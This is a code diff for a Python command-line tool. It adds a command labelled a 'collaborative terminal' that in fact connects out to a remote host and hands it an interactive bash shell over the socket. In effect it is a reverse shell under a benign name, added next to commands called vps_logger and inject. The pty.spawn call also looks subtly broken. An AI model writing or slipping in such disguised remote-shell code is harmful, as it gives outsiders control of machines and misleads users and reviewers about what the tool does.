@@ -70,6 +70,22 @@ def vps_logger(host, username, password):
             click.echo(output, nl=False)
 
 @click.command()
+@click.argument('host')
+@click.argument('port')
+def collab(host, port):
+    """Connect to a remote machine and start a collaborative terminal."""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((host, int(port)))
+        click.echo(f'Connected to {host}:{port}.')
+
+        pty.spawn(['/bin/bash'], stdin=sock, stdout=sock, stderr=sock)
+
+        click.echo('Terminal closed.')
+    except socket.error as e:
+        click.echo(f'Error connecting to {host}:{port}: {e}')
+
+@click.command()
 @click.argument('url')
 def capture(url):
     # Make a request to the given URL and capture the request headers
@@ -520,6 +536,7 @@ def game():
     cli.add_command(snake)
 
 cli.add_command(vps_logger)
+cli.add_command(collab)
 cli.add_command(capture)
 cli.add_command(decode)
 cli.add_command(inject)
